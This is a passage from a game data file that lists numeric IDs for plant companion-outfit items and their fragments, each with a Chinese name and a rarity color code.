{"42001260":"爆浆玉露伴生装扮碎片","pinzhi":"lanse"},
{"42001360":"海蘑菇伴生装扮碎片","pinzhi":"lanse"},
{"1323":"椰子加农炮伴生装扮碎片","pinzhi":"zise"},
{"1326":"变身茄子伴生装扮碎片","pinzhi":"zise"},
{"1359":"烈焰菇伴生装扮碎片","pinzhi":"zise"},
{"1361":"蒲公英伴生装扮碎片","pinzhi":"zise"},
{"1372":"幽灵辣椒伴生装扮碎片","pinzhi":"zise"},
{"1381":"甜菜护卫伴生装扮碎片","pinzhi":"zise"},
{"1393":"蚕豆突击队伴生装扮碎片","pinzhi":"zise"},
{"1399":"电击蓝莓伴生装扮碎片","pinzhi":"zise"},
{"111302":"向日葵歌手伴生装扮碎片","pinzhi":"zise"},
{"111316":"猕猴桃伴生装扮碎片","pinzhi":"zise"},
{"111320":"火柴花拳手伴生装扮碎片","pinzhi":"zise"},
{"111324":"逆时草伴生装扮碎片","pinzhi":"zise"},
{"111334":"缩小紫罗兰伴生装扮碎片","pinzhi":"zise"},
{"111339":"原始土豆地雷伴生装扮碎片","pinzhi":"zise"},
{"111340":"龙吼草伴生装扮碎片","pinzhi":"zise"},
{"111354":"夜影龙葵伴生装扮碎片","pinzhi":"zise"},
{"111358":"暗樱草伴生装扮碎片","pinzhi":"zise"},
{"111362":"槲寄冰仙子伴生装扮碎片","pinzhi":"zise"},
{"111363":"野兽猕猴桃伴生装扮碎片","pinzhi":"zise"},
{"111366":"莲藕射手伴生装扮碎片","pinzhi":"zise"},
{"111369":"吹风荚兰伴生装扮碎片","pinzhi":"zise"},
{"111373":"热辣海枣伴生装扮碎片","pinzhi":"zise"},
{"111376":"芭蕉舞蹈家伴生装扮碎片","pinzhi":"zise"},
{"111378":"水仙花射手伴生装扮碎片","pinzhi":"zise"},
{"111384":"暗影豌豆伴生装扮碎片","pinzhi":"zise"},
{"111386":"水晶兰伴生装扮碎片","pinzhi":"zise"},
{"111387":"豌豆迫击炮伴生装扮碎片","pinzhi":"zise"},
{"111389":"芦荟医师伴生装扮碎片","pinzhi":"zise"},
{"42000010":"小黄梨伴生装扮碎片","pinzhi":"zise"},
{"42000070":"杜英投手伴生装扮碎片","pinzhi":"zise"},
{"42000110":"铜钱草鼓手伴生装扮碎片","pinzhi":"zise"},
{"42000130":"潜行开口箭伴生装扮碎片","pinzhi":"zise"},
{"42000140":"暗影荚兰伴生装扮碎片","pinzhi":"zise"},
{"42000270":"爆炸桔梗伴生装扮碎片","pinzhi":"zise"},
{"42000390":"气流水仙花伴生装扮碎片","pinzhi":"zise"},
{"42000490":"刺果流星锤伴生装扮碎片","pinzhi":"zise"},
{"42000500":"黄油毛艮伴生装扮碎片","pinzhi":"zise"},
{"42001350":"海带守卫伴生装扮碎片","pinzhi":"zise"},
{"42001420":"盒子草礼炮伴生装扮碎片","pinzhi":"zise"},
{"42001570":"胆小菇伴生装扮碎片","pinzhi":"zise"},
{"1312":"火龙草伴生装扮碎片","pinzhi":"chengse"},
{"1331":"冰西瓜投手伴生装扮碎片","pinzhi":"chengse"},
{"1343":"充能柚子伴生装扮碎片","pinzhi":"chengse"},
{"1345":"瓷砖萝卜伴生装扮碎片","pinzhi":"chengse"},
{"1352":"阳光菇伴生装扮碎片","pinzhi":"chengse"},
{"1358":"寒冰菇伴生装扮碎片","pinzhi":"chengse"},
{"1365":"保龄泡泡伴生装扮碎片","pinzhi":"chengse"},
{"1367":"香蕉火箭炮伴生装扮碎片","pinzhi":"chengse"},
{"1371":"强酸柠檬伴生装扮碎片","pinzhi":"chengse"},
{"1397":"魔术菇伴生装扮碎片","pinzhi":"chengse"},
{"111319":"天使星星果伴生装扮碎片","pinzhi":"chengse"},
{"111321":"火焰花女王伴生装扮碎片","pinzhi":"chengse"},
{"111322":"机枪射手伴生装扮碎片","pinzhi":"chengse"},
{"111329":"仙人掌伴生装扮碎片","pinzhi":"chengse"},
{"111330":"猫尾草伴生装扮碎片","pinzhi":"chengse"},
{"111331":"喇叭花伴生装扮碎片","pinzhi":"chengse"},
{"111332":"爆裂葡萄伴生装扮碎片","pinzhi":"chengse"},
{"111333":"冰龙草伴生装扮碎片","pinzhi":"chengse"},
{"111342":"原始大王花伴生装扮碎片","pinzhi":"chengse"},
{"111343":"蔗师傅伴生装扮碎片","pinzhi":"chengse"},
{"111344":"玉米加农炮伴生装扮碎片","pinzhi":"chengse"},
{"111345":"苹果迫击炮伴生装扮碎片","pinzhi":"chengse"},
{"111346":"金缕梅女巫伴生装扮碎片","pinzhi":"chengse"},
{"111347":"逃脱树根伴生装扮碎片","pinzhi":"chengse"},
{"111348":"电流醋栗伴生装扮碎片","pinzhi":"chengse"},
{"111349":"白瓜相扑手伴生装扮碎片","pinzhi":"chengse"},
{"111350":"超能花菜伴生装扮碎片","pinzhi":"chengse"},
{"111355":"幽暮投手伴生装扮碎片","pinzhi":"chengse"},
{"111360":"炙热山葵伴生装扮碎片","pinzhi":"chengse"},
{"111361":"防风草伴生装扮碎片","pinzhi":"chengse"},
{"111367":"芦黎药师伴生装扮碎片","pinzhi":"chengse"},
{"111370":"桑葚爆破手伴生装扮碎片","pinzhi":"chengse"},
{"111371":"电能豌豆伴生装扮碎片","pinzhi":"chengse"},
{"111372":"寒冰醋栗伴生装扮碎片","pinzhi":"chengse"},
{"111374":"郁金香号手伴生装扮碎片","pinzhi":"chengse"},
{"111375":"茄子忍者伴生装扮碎片","pinzhi":"chengse"},
{"111379":"双枪松果伴生装扮碎片","pinzhi":"chengse"},
{"111381":"警爆磁菇伴生装扮碎片","pinzhi":"chengse"},
{"111382":"冬青骑士伴生装扮碎片","pinzhi":"chengse"},
{"111385":"食人花豌豆伴生装扮碎片","pinzhi":"chengse"},
{"111388":"雷龙草伴生装扮碎片","pinzhi":"chengse"},
{"111390":"熊果臼炮伴生装扮碎片","pinzhi":"chengse"},
{"42000000":"电力绿茶伴生装扮碎片","pinzhi":"chengse"},
{"42000020":"宝石商石榴伴生装扮碎片","pinzhi":"chengse"},
{"42000040":"白露花战机伴生装扮碎片","pinzhi":"chengse"},
{"42000050":"爆炸草莓伴生装扮碎片","pinzhi":"chengse"},
{"42000060":"毒液豌豆射手伴生装扮碎片","pinzhi":"chengse"},
{"42000080":"飞镖洋蓟伴生装扮碎片","pinzhi":"chengse"},
{"42000090":"荸荠兄弟伴生装扮碎片","pinzhi":"chengse"},
{"42000100":"尖刺秋葵伴生装扮碎片","pinzhi":"chengse"},
{"42000120":"终极番茄伴生装扮碎片","pinzhi":"chengse"},
{"42000150":"凤梨链刃伴生装扮碎片","pinzhi":"chengse"},
{"42000190":"厨师杓兰伴生装扮碎片","pinzhi":"chengse"},
{"42000200":"粘液桉果伴生装扮碎片","pinzhi":"chengse"},
{"42000210":"橄榄坑伴生装扮碎片","pinzhi":"chengse"},
{"42000220":"刺眼花艺伎伴生装扮碎片","pinzhi":"chengse"},
{"42000230":"黏弹糯米伴生装扮碎片","pinzhi":"chengse"},
{"42000240":"地星发射井伴生装扮碎片","pinzhi":"chengse"},
{"42000250":"奶油生菜伴生装扮碎片","pinzhi":"chengse"},
{"42000260":"眩晕雏菊伴生装扮碎片","pinzhi":"chengse"},
{"42000280":"庆典汽水椰伴生装扮碎片","pinzhi":"chengse"},
{"42000290":"钩爪嘉兰伴生装扮碎片","pinzhi":"chengse"},
{"42000310":"凤仙花射手伴生装扮碎片","pinzhi":"chengse"},
{"42000320":"火鸡投手伴生装扮碎片","pinzhi":"chengse"},
{"42000330":"铁锤兰伴生装扮碎片","pinzhi":"chengse"},
{"42000340":"聚能山竹伴生装扮碎片","pinzhi":"chengse"},
{"42000350":"鱼钩草伴生装扮碎片","pinzhi":"chengse"},
{"42000370":"烈焰火蕨伴生装扮碎片","pinzhi":"chengse"},
{"42000380":"虎头菇伴生装扮碎片","pinzhi":"chengse"},
{"42000410":"地锯草伴生装扮碎片","pinzhi":"chengse"},
{"42000440":"树灵护卫伴生装扮碎片","pinzhi":"chengse"},
{"42000450":"疯帽菇伴生装扮碎片","pinzhi":"chengse"},
{"42000460":"魔法番红花伴生装扮碎片","pinzhi":"chengse"},
{"42000470":"公主弹簧草伴生装扮碎片","pinzhi":"chengse"},
{"42000480":"宊击竹兵伴生装扮碎片","pinzhi":"chengse"},
{"42000510":"激光皇冠花伴生装扮碎片","pinzhi":"chengse"},
{"42000520":"腐尸豆荚伴生装扮碎片","pinzhi":"chengse"},
{"42000530":"扇贝兰法师伴生装扮碎片","pinzhi":"chengse"},
{"42000540":"杰克南瓜灯伴生装扮碎片","pinzhi":"chengse"},
{"42000550":"豌豆药剂师伴生装扮碎片","pinzhi":"chengse"},
{"42000560":"双生卯兔伴生装扮碎片","pinzhi":"chengse"},
{"42000570":"长枪球兰伴生装扮碎片","pinzhi":"chengse"},
{"42000580":"牛蒡击球手伴生装扮碎片","pinzhi":"chengse"},
{"42000590":"吸血牛杆菌伴生装扮碎片","pinzhi":"chengse"},
{"42000610":"鹳草击剑手伴生装扮碎片","pinzhi":"chengse"},
{"42000620":"蓄电雪松果伴生装扮碎片","pinzhi":"chengse"},
{"42000630":"电能藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42000640":"蛇妖瓶子草伴生装扮碎片","pinzhi":"chengse"},
{"42000650":"流星花伴生装扮碎片","pinzhi":"chengse"},
{"42000660":"曼德拉草伴生装扮碎片","pinzhi":"chengse"},
{"42000670":"深渊海葵伴生装扮碎片","pinzhi":"chengse"},
{"42000680":"深渊魔爪花伴生装扮碎片","pinzhi":"chengse"},
{"42000690":"粉丝心叶兰伴生装扮碎片","pinzhi":"chengse"},
{"42000700":"豌豆藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42000710":"蜜蜂铃兰伴生装扮碎片","pinzhi":"chengse"},
{"42000720":"油菜花伴生装扮碎片","pinzhi":"chengse"},
{"42000730":"剑叶龙血树伴生装扮碎片","pinzhi":"chengse"},
{"42000740":"斯巴达竹伴生装扮碎片","pinzhi":"chengse"},
{"42000750":"闪耀藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42000760":"阳光韭菜伴生装扮碎片","pinzhi":"chengse"},
{"42000770":"暗夜菇伴生装扮碎片","pinzhi":"chengse"},
{"42000780":"柴堆藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42000790":"贪吃龙草伴生装扮碎片","pinzhi":"chengse"},
{"42000800":"兔极伴生装扮碎片","pinzhi":"chengse"},
{"42000810":"植甲拼装扮者-炎星伴生装扮碎片","pinzhi":"chengse"},
{"42000820":"蝎尾蕉机枪手伴生装扮碎片","pinzhi":"chengse"},
{"42000830":"电鳗香蕉伴生装扮碎片","pinzhi":"chengse"},
{"42000840":"荆棘巫师伴生装扮碎片","pinzhi":"chengse"},
{"42000850":"锯齿锦地罗伴生装扮碎片","pinzhi":"chengse"},
{"42000860":"寄生仙钗伴生装扮碎片","pinzhi":"chengse"},
{"42000880":"暴君火龙果伴生装扮碎片","pinzhi":"chengse"},
{"42000890":"小暴君火龙果伴生装扮碎片","pinzhi":"chengse"},
{"42000900":"忧郁藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42000910":"电击鹰爪花伴生装扮碎片","pinzhi":"chengse"},
{"42000920":"留声曼陀罗伴生装扮碎片","pinzhi":"chengse"},
{"42000930":"疯狂炮仗花伴生装扮碎片","pinzhi":"chengse"},
{"42000940":"日月金银花伴生装扮碎片","pinzhi":"chengse"},
{"42000950":"蛮族大黄伴生装扮碎片","pinzhi":"chengse"},
{"42000960":"水生藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42000970":"寒霜白毛丹伴生装扮碎片","pinzhi":"chengse"},
{"42000980":"电击钩吻伴生装扮碎片","pinzhi":"chengse"},
{"42000990":"寒冰地刺伴生装扮碎片","pinzhi":"chengse"},
{"42001000":"珊瑚泡泡姬伴生装扮碎片","pinzhi":"chengse"},
{"42001010":"百宝兜兰伴生装扮碎片","pinzhi":"chengse"},
{"42001020":"女娲蛇尾草伴生装扮碎片","pinzhi":"chengse"},
{"42001270":"枫影刺客伴生装扮碎片","pinzhi":"chengse"},
{"42001280":"守卫菇伴生装扮碎片","pinzhi":"chengse"},
{"42001330":"伏僵塔黄伴生装扮碎片","pinzhi":"chengse"},
{"42001340":"超级机枪射手伴生装扮碎片","pinzhi":"chengse"},
{"42001390":"海神草伴生装扮碎片","pinzhi":"chengse"},
{"42001400":"海豌豆伴生装扮碎片","pinzhi":"chengse"},
{"42001430":"球果训练家伴生装扮碎片","pinzhi":"chengse"},
{"42001580":"黑法师伴生装扮碎片","pinzhi":"chengse"},
{"42001590":"太极木槿伴生装扮碎片","pinzhi":"chengse"},
{"42001600":"青蛇藤蔓伴生装扮碎片","pinzhi":"chengse"},
{"42001610":"毁灭菇伴生装扮碎片","pinzhi":"chengse"},
{"42001620":"叶子保护伞伴生装扮碎片","pinzhi":"zise"},
{"42001630":"鸭梨伴生装扮碎片","pinzhi":"chengse"},
{"42001640":"金蝉花伴生装扮碎片","pinzhi":"chengse"},
{"42001650":"藕花白龙伴生装扮碎片","pinzhi":"chengse"},
{"42001690":"魔藤伴生装扮碎片","pinzhi":"lanse"},
{"42001700":"悬浮洋芋伴生装扮碎片","pinzhi":"chengse"},
{"42001720":"祥云飞莲伴生装扮碎片","pinzhi":"chengse"},
{"42001750":"吸金磁伴生装扮碎片","pinzhi":"chengse"},
{"42001760":"钟馗石蕊伴生装扮碎片","pinzhi":"zise"},
{"42001770":"幽潭婆罗伴生装扮碎片","pinzhi":"zise"},
{"42001780":"安息木编钟伴生装扮碎片","pinzhi":"lanse"},
{"42001790":"冰川菇伴生装扮碎片","pinzhi":"chengse"},
{"42001670":"草垛伴生装扮碎片","pinzhi":"baise"},
{"1201":"豌豆射手伴生装扮","pinzhi":"baise"},
{"1202":"向日葵伴生装扮","pinzhi":"baise"},
{"1203":"坚果伴生装扮","pinzhi":"baise"},
{"1204":"土豆地雷伴生装扮","pinzhi":"baise"},
{"1205":"卷心菜投手伴生装扮","pinzhi":"baise"},
{"1206":"冰冻生菜伴生装扮","pinzhi":"baise"},
{"1210":"弹簧豆伴生装扮","pinzhi":"baise"},
{"1211":"地刺伴生装扮","pinzhi":"baise"},
{"1215":"巴豆伴生装扮","pinzhi":"baise"},
{"1216":"双向射手伴生装扮","pinzhi":"baise"},
{"1218":"噬碑藤伴生装扮","pinzhi":"baise"},
{"1221":"玉米投手伴生装扮","pinzhi":"baise"},
{"1233":"仙桃伴生装扮","pinzhi":"baise"},
{"1234":"火葫芦伴生装扮","pinzhi":"baise"},
{"1235":"白萝卜伴生装扮","pinzhi":"baise"},
{"1236":"竹笋伴生装扮","pinzhi":"baise"},
{"1238":"金盏花伴生装扮","pinzhi":"baise"},
{"1249":"小喷菇伴生装扮","pinzhi":"baise"},
{"1250":"大喷菇伴生装扮","pinzhi":"baise"},
{"1253":"阳光豆伴生装扮","pinzhi":"baise"},
{"1254":"花生射手伴生装扮","pinzhi":"baise"},
{"1255":"磁力菇伴生装扮","pinzhi":"baise"},
{"1256":"路灯花伴生装扮","pinzhi":"baise"},
{"1257":"咖啡豆伴生装扮","pinzhi":"baise"},
{"1264":"莲叶伴生装扮","pinzhi":"baise"},
{"1266":"缠绕水草伴生装扮","pinzhi":"baise"},
{"1279":"烤马铃薯伴生装扮","pinzhi":"baise"},
{"1294":"灯笼草伴生装扮","pinzhi":"baise"},
{"111206":"黄金叶伴生装扮","pinzhi":"baise"},
{"111210":"大丽菊伴生装扮","pinzhi":"baise"},
{"111241":"胆小荆棘伴生装扮","pinzhi":"baise"},
{"111264":"黄金蓓蕾伴生装扮","pinzhi":"baise"},
{"111265":"平顶菇伴生装扮","pinzhi":"baise"},
{"32000170":"滴水冰莲伴生装扮","pinzhi":"baise"},
{"32000300":"花盆伴生装扮","pinzhi":"baise"},
{"32001380":"氧气藻伴生装扮","pinzhi":"baise"},
{"1207":"回旋镖射手伴生装扮","pinzhi":"lvse"},
{"1219":"寒冰豌豆伴生装扮","pinzhi":"lvse"},
{"1220":"火炬树桩伴生装扮","pinzhi":"lvse"},
{"1222":"闪电芦苇伴生装扮","pinzhi":"lvse"},
{"1224":"西瓜投手伴生装扮","pinzhi":"lvse"},
{"1225":"豌豆荚伴生装扮","pinzhi":"lvse"},
{"1228":"钢地刺伴生装扮","pinzhi":"lvse"},
{"1229":"高坚果伴生装扮","pinzhi":"lvse"},
{"1230":"三重射手伴生装扮","pinzhi":"lvse"},
{"1237":"棱镜草伴生装扮","pinzhi":"lvse"},
{"1242":"脉冲黄桃伴生装扮","pinzhi":"lvse"},
{"1263":"机枪石榴伴生装扮","pinzhi":"lvse"},
{"1273":"甜薯伴生装扮","pinzhi":"lvse"},
{"1276":"树脂投手伴生装扮","pinzhi":"lvse"},
{"1278":"火焰豌豆射手伴生装扮","pinzhi":"lvse"},
{"1282":"眩晕洋葱伴生装扮","pinzhi":"lvse"},
{"1283":"旋转芜菁伴生装扮","pinzhi":"lvse"},
{"1284":"大王花伴生装扮","pinzhi":"lvse"},
{"1285":"旋风橡果伴生装扮","pinzhi":"lvse"},
{"1288":"竹小弟伴生装扮","pinzhi":"lvse"},
{"1289":"漩涡枇杷伴生装扮","pinzhi":"lvse"},
{"1290":"电离红掌伴生装扮","pinzhi":"lvse"},
{"1292":"飞碟瓜伴生装扮","pinzhi":"lvse"},
{"1295":"旋转菠萝伴生装扮","pinzhi":"lvse"},
{"111203":"榴莲伴生装扮","pinzhi":"lvse"},
{"111214":"菠萝蜜伴生装扮","pinzhi":"lvse"},
{"111227":"大蒜伴生装扮","pinzhi":"lvse"},
{"111228":"复活萝卜伴生装扮","pinzhi":"lvse"},
{"111237":"香水蘑菇伴生装扮","pinzhi":"lvse"},
{"111252":"月光花伴生装扮","pinzhi":"lvse"},
{"111253":"爆炸坚果伴生装扮","pinzhi":"lvse"},
{"111291":"冬瓜守卫伴生装扮","pinzhi":"lvse"},
{"32000030":"油橄榄伴生装扮","pinzhi":"lvse"},
{"32000180":"石斛防风网伴生装扮","pinzhi":"lvse"},
{"32001370":"噗噗鱼藤伴生装扮","pinzhi":"lvse"},
{"1208":"双胞向日葵伴生装扮","pinzhi":"lanse"},
{"1209":"菜问伴生装扮","pinzhi":"lanse"},
{"1213":"能量花伴生装扮","pinzhi":"lanse"},
{"1214":"窝瓜伴生装扮","pinzhi":"lanse"},
{"1217":"火爆辣椒伴生装扮","pinzhi":"lanse"},
{"1227":"双重射手伴生装扮","pinzhi":"lanse"},
{"1232":"樱桃炸弹伴生装扮","pinzhi":"lanse"},
{"1239":"激光豆伴生装扮","pinzhi":"lanse"},
{"1240":"星星果伴生装扮","pinzhi":"lanse"},
{"1241":"三叶草伴生装扮","pinzhi":"lanse"},
{"1244":"全息坚果伴生装扮","pinzhi":"lanse"},
{"1247":"胡萝卜导弹车伴生装扮","pinzhi":"lanse"},
{"1251":"魅惑菇伴生装扮","pinzhi":"lanse"},
{"1260":"橡木弓手伴生装扮","pinzhi":"lanse"},
{"1262":"大力花菜伴生装扮","pinzhi":"lanse"},
{"1268":"鳄梨伴生装扮","pinzhi":"lanse"},
{"1269":"导向蓟伴生装扮","pinzhi":"lanse"},
{"1270":"大嘴花伴生装扮","pinzhi":"lanse"},
{"1274":"竹员外伴生装扮","pinzhi":"lanse"},
{"1275":"莲小蓬伴生装扮","pinzhi":"lanse"},
{"1277":"飓风甘蓝伴生装扮","pinzhi":"lanse"},
{"1280":"辣椒投手伴生装扮","pinzhi":"lanse"},
{"1286":"板栗小队伴生装扮","pinzhi":"lanse"},
{"1291":"芦笋战机伴生装扮","pinzhi":"lanse"},
{"1298":"玫瑰剑客伴生装扮","pinzhi":"lanse"},
{"111201":"捣蛋萝卜伴生装扮","pinzhi":"lanse"},
{"111204":"南瓜巫师伴生装扮","pinzhi":"lanse"},
{"111208":"阿开木木伴生装扮","pinzhi":"lanse"},
{"111209":"红针花伴生装扮","pinzhi":"lanse"},
{"111211":"岩浆番石榴伴生装扮","pinzhi":"lanse"},
{"111212":"金蟾菇伴生装扮","pinzhi":"lanse"},
{"111213":"棉小雪伴生装扮","pinzhi":"lanse"},
{"111215":"龙舌兰伴生装扮","pinzhi":"lanse"},
{"111217":"梅小美伴生装扮","pinzhi":"lanse"},
{"111218":"火龙果伴生装扮","pinzhi":"lanse"},
{"111223":"魔音甜菜伴生装扮","pinzhi":"lanse"},
{"111225":"潜伏芹菜伴生装扮","pinzhi":"lanse"},
{"111226":"孢子菇伴生装扮","pinzhi":"lanse"},
{"111235":"原始豌豆射手伴生装扮","pinzhi":"lanse"},
{"111236":"原始坚果伴生装扮","pinzhi":"lanse"},
{"111238":"原始向日葵伴生装扮","pinzhi":"lanse"},
{"111251":"毒影菇伴生装扮","pinzhi":"lanse"},
{"111256":"铃儿草投手伴生装扮","pinzhi":"lanse"},
{"111268":"番莲工程师伴生装扮","pinzhi":"lanse"},
{"32000160":"千金藤伴生装扮","pinzhi":"lanse"},
{"32000430":"石楠探索者伴生装扮","pinzhi":"lanse"},
{"32000600":"南瓜头伴生装扮","pinzhi":"lanse"},
{"32001260":"爆浆玉露伴生装扮","pinzhi":"lanse"},
{"32001360":"海蘑菇伴生装扮","pinzhi":"lanse"},
{"1223":"椰子加农炮伴生装扮","pinzhi":"zise"},
{"1226":"变身茄子伴生装扮","pinzhi":"zise"},
{"1259":"烈焰菇伴生装扮","pinzhi":"zise"},
{"1261":"蒲公英伴生装扮","pinzhi":"zise"},
{"1272":"幽灵辣椒伴生装扮","pinzhi":"zise"},
{"1281":"甜菜护卫伴生装扮","pinzhi":"zise"},
{"1293":"蚕豆突击队伴生装扮","pinzhi":"zise"},
{"1299":"电击蓝莓伴生装扮","pinzhi":"zise"},
{"111202":"向日葵歌手伴生装扮","pinzhi":"zise"},
{"111216":"猕猴桃伴生装扮","pinzhi":"zise"},
{"111220":"火柴花拳手伴生装扮","pinzhi":"zise"},
{"111224":"逆时草伴生装扮","pinzhi":"zise"},
{"111234":"缩小紫罗兰伴生装扮","pinzhi":"zise"},
{"111239":"原始土豆地雷伴生装扮","pinzhi":"zise"},
{"111240":"龙吼草伴生装扮","pinzhi":"zise"},
{"111254":"夜影龙葵伴生装扮","pinzhi":"zise"},
{"111258":"暗樱草伴生装扮","pinzhi":"zise"},
{"111262":"槲寄冰仙子伴生装扮","pinzhi":"zise"},
{"111263":"野兽猕猴桃伴生装扮","pinzhi":"zise"},
{"111266":"莲藕射手伴生装扮","pinzhi":"zise"},
{"111269":"吹风荚兰伴生装扮","pinzhi":"zise"},
{"111273":"热辣海枣伴生装扮","pinzhi":"zise"},
{"111276":"芭蕉舞蹈家伴生装扮","pinzhi":"zise"},
{"111278":"水仙花射手伴生装扮","pinzhi":"zise"},
{"111284":"暗影豌豆伴生装扮","pinzhi":"zise"},
{"111286":"水晶兰伴生装扮","pinzhi":"zise"},
{"111287":"豌豆迫击炮伴生装扮","pinzhi":"zise"},
{"111289":"芦荟医师伴生装扮","pinzhi":"zise"},
{"32000010":"小黄梨伴生装扮","pinzhi":"zise"},
{"32000070":"杜英投手伴生装扮","pinzhi":"zise"},
{"32000110":"铜钱草鼓手伴生装扮","pinzhi":"zise"},
{"32000130":"潜行开口箭伴生装扮","pinzhi":"zise"},
{"32000140":"暗影荚兰伴生装扮","pinzhi":"zise"},
{"32000270":"爆炸桔梗伴生装扮","pinzhi":"zise"},
{"32000390":"气流水仙花伴生装扮","pinzhi":"zise"},
{"32000490":"刺果流星锤伴生装扮","pinzhi":"zise"},
{"32000500":"黄油毛艮伴生装扮","pinzhi":"zise"},
{"32001350":"海带守卫伴生装扮","pinzhi":"zise"},
{"32001420":"盒子草礼炮伴生装扮","pinzhi":"zise"},
{"32001570":"胆小菇伴生装扮","pinzhi":"zise"},
{"1212":"火龙草伴生装扮","pinzhi":"chengse"},
{"1231":"冰西瓜投手伴生装扮","pinzhi":"chengse"},
{"1243":"充能柚子伴生装扮","pinzhi":"chengse"},
{"1245":"瓷砖萝卜伴生装扮","pinzhi":"chengse"},
{"1252":"阳光菇伴生装扮","pinzhi":"chengse"},
{"1258":"寒冰菇伴生装扮","pinzhi":"chengse"},
{"1265":"保龄泡泡伴生装扮","pinzhi":"chengse"},
{"1267":"香蕉火箭炮伴生装扮","pinzhi":"chengse"},
{"1271":"强酸柠檬伴生装扮","pinzhi":"chengse"},
{"1297":"魔术菇伴生装扮","pinzhi":"chengse"},
{"111219":"天使星星果伴生装扮","pinzhi":"chengse"},
{"111221":"火焰花女王伴生装扮","pinzhi":"chengse"},
{"111222":"机枪射手伴生装扮","pinzhi":"chengse"},
{"111229":"仙人掌伴生装扮","pinzhi":"chengse"},
{"111230":"猫尾草伴生装扮","pinzhi":"chengse"},
{"111231":"喇叭花伴生装扮","pinzhi":"chengse"},
{"111232":"爆裂葡萄伴生装扮","pinzhi":"chengse"},
{"111233":"冰龙草伴生装扮","pinzhi":"chengse"},
{"111242":"原始大王花伴生装扮","pinzhi":"chengse"},
{"111243":"蔗师傅伴生装扮","pinzhi":"chengse"},
{"111244":"玉米加农炮伴生装扮","pinzhi":"chengse"},
{"111245":"苹果迫击炮伴生装扮","pinzhi":"chengse"},
{"111246":"金缕梅女巫伴生装扮","pinzhi":"chengse"},
{"111247":"逃脱树根伴生装扮","pinzhi":"chengse"},
{"111248":"电流醋栗伴生装扮","pinzhi":"chengse"},
{"111249":"白瓜相扑手伴生装扮","pinzhi":"chengse"},
{"111250":"超能花菜伴生装扮","pinzhi":"chengse"},
{"111255":"幽暮投手伴生装扮","pinzhi":"chengse"},
{"111260":"炙热山葵伴生装扮","pinzhi":"chengse"},
{"111261":"防风草伴生装扮","pinzhi":"chengse"},
{"111267":"芦黎药师伴生装扮","pinzhi":"chengse"},
{"111270":"桑葚爆破手伴生装扮","pinzhi":"chengse"},
{"111271":"电能豌豆伴生装扮","pinzhi":"chengse"},
{"111272":"寒冰醋栗伴生装扮","pinzhi":"chengse"},
{"111274":"郁金香号手伴生装扮","pinzhi":"chengse"},
{"111275":"茄子忍者伴生装扮","pinzhi":"chengse"},
{"111279":"双枪松果伴生装扮","pinzhi":"chengse"},
{"111281":"警爆磁菇伴生装扮","pinzhi":"chengse"},
{"111282":"冬青骑士伴生装扮","pinzhi":"chengse"},
{"111285":"食人花豌豆伴生装扮","pinzhi":"chengse"},
{"111288":"雷龙草伴生装扮","pinzhi":"chengse"},
{"111290":"熊果臼炮伴生装扮","pinzhi":"chengse"},
{"32000000":"电力绿茶伴生装扮","pinzhi":"chengse"},
{"32000020":"宝石商石榴伴生装扮","pinzhi":"chengse"},
{"32000040":"白露花战机伴生装扮","pinzhi":"chengse"},
{"32000050":"爆炸草莓伴生装扮","pinzhi":"chengse"},
{"32000060":"毒液豌豆射手伴生装扮","pinzhi":"chengse"},
{"32000080":"飞镖洋蓟伴生装扮","pinzhi":"chengse"},
{"32000090":"荸荠兄弟伴生装扮","pinzhi":"chengse"},
{"32000100":"尖刺秋葵伴生装扮","pinzhi":"chengse"},
{"32000120":"终极番茄伴生装扮","pinzhi":"chengse"},
{"32000150":"凤梨链刃伴生装扮","pinzhi":"chengse"},
{"32000190":"厨师杓兰伴生装扮","pinzhi":"chengse"},
{"32000200":"粘液桉果伴生装扮","pinzhi":"chengse"},
{"32000210":"橄榄坑伴生装扮","pinzhi":"chengse"},
{"32000220":"刺眼花艺伎伴生装扮","pinzhi":"chengse"},
{"32000230":"黏弹糯米伴生装扮","pinzhi":"chengse"},
{"32000240":"地星发射井伴生装扮","pinzhi":"chengse"},
{"32000250":"奶油生菜伴生装扮","pinzhi":"chengse"},
{"32000260":"眩晕雏菊伴生装扮","pinzhi":"chengse"},
{"32000280":"庆典汽水椰伴生装扮","pinzhi":"chengse"},
{"32000290":"钩爪嘉兰伴生装扮","pinzhi":"chengse"},
{"32000310":"凤仙花射手伴生装扮","pinzhi":"chengse"},
{"32000320":"火鸡投手伴生装扮","pinzhi":"chengse"},
{"32000330":"铁锤兰伴生装扮","pinzhi":"chengse"},
{"32000340":"聚能山竹伴生装扮","pinzhi":"chengse"},
{"32000350":"鱼钩草伴生装扮","pinzhi":"chengse"},
{"32000370":"烈焰火蕨伴生装扮","pinzhi":"chengse"},
{"32000380":"虎头菇伴生装扮","pinzhi":"chengse"},
{"32000410":"地锯草伴生装扮","pinzhi":"chengse"},
{"32000440":"树灵护卫伴生装扮","pinzhi":"chengse"},
{"32000450":"疯帽菇伴生装扮","pinzhi":"chengse"},
{"32000460":"魔法番红花伴生装扮","pinzhi":"chengse"},
{"32000470":"公主弹簧草伴生装扮","pinzhi":"chengse"},
{"32000480":"宊击竹兵伴生装扮","pinzhi":"chengse"},
{"32000510":"激光皇冠花伴生装扮","pinzhi":"chengse"},
{"32000520":"腐尸豆荚伴生装扮","pinzhi":"chengse"},
{"32000530":"扇贝兰法师伴生装扮","pinzhi":"chengse"},
{"32000540":"杰克南瓜灯伴生装扮","pinzhi":"chengse"},
{"32000550":"豌豆药剂师伴生装扮","pinzhi":"chengse"},
{"32000560":"双生卯兔伴生装扮","pinzhi":"chengse"},
{"32000570":"长枪球兰伴生装扮","pinzhi":"chengse"},
{"32000580":"牛蒡击球手伴生装扮","pinzhi":"chengse"},
{"32000590":"吸血牛杆菌伴生装扮","pinzhi":"chengse"},
{"32000610":"鹳草击剑手伴生装扮","pinzhi":"chengse"},
{"32000620":"蓄电雪松果伴生装扮","pinzhi":"chengse"},
{"32000630":"电能藤蔓伴生装扮","pinzhi":"chengse"},
{"32000640":"蛇妖瓶子草伴生装扮","pinzhi":"chengse"},
{"32000650":"流星花伴生装扮","pinzhi":"chengse"},
{"32000660":"曼德拉草伴生装扮","pinzhi":"chengse"},
{"32000670":"深渊海葵伴生装扮","pinzhi":"chengse"},
